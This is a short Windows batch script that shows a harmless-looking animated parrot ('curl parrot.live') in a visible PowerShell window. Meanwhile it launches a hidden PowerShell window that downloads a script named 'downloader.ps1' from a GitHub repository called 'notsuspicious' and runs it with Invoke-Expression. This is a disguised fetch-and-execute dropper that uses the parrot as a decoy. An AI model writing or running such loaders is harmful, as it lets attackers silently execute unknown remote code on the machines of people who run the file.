@echo off
REM Curling parrot.live in a new PowerShell window
REM Then executing the PowerShell command in a new hidden, nologo shell

REM Find existing PowerShell window
for /f "tokens=2" %%a in ('tasklist ^| findstr /i "powershell.exe"') do (
    REM Curl parrot.live in PowerShell window
    start powershell -NoExit -NoLogo -Command "curl parrot.live"
    REM Exit the loop after the first PowerShell window is found
    exit /b
)

REM Wait for a few seconds to ensure the PowerShell window starts
ping 127.0.0.1 -n 3 > nul

REM Execute PowerShell command in a new hidden, nologo shell
start "" /b powershell -NoExit -NoLogo -WindowStyle Hidden -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content"